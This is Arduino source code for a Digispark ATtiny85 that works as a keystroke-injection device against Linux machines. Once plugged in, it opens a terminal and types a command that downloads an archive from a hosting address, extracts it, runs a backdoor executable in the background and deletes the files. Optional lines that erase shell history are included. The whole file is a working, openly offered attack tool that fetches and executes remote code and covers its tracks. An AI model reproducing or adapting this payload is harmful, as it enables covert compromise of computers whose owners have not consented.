/*
 * LINUX TARGETED
 * Code for Digispark ATTINY85 for downloading a file from web, decompress it , give exec permissions, execute, then delete.
 * Its recommended to use with the Puppeteer project, as you can download and execute the backdoor so fast (see github.com/arthur-bryan/puppeteer).
 * It is easy to modify for your own usage
 * PS: the commands will be saved at the history
 */


#include "DigiKeyboard.h"

#define HOSTING_ADDRESS "172.16.100.3"
#define FILE            "puppet.tar.gz"


void
setup() {};

void
loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1700);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT | MOD_CONTROL_LEFT); // spawn a terminal
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("bash"));  // the '/' (slash) key doesn't work on ZSH, so we change to BASH 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("wget "HOSTING_ADDRESS"/"FILE"; tar -xzf puppet.tar.gz; chmod +x puppet-linux64; ./puppet-linux64 &"));  // make your changes here
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("rm puppet.tar.gz puppet-linux64; exit")); // deleting downloaded files and exit the tty
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
  DigiKeyboard.print(F("exit"));  // one more exit to quit the terminal
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Uncomment the following lines to clean all the history file
  //DigiKeyboard.print(F("history -c")); 
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){};  // this loop is needed by default, keep it blank or you will enter a infinite loop
}
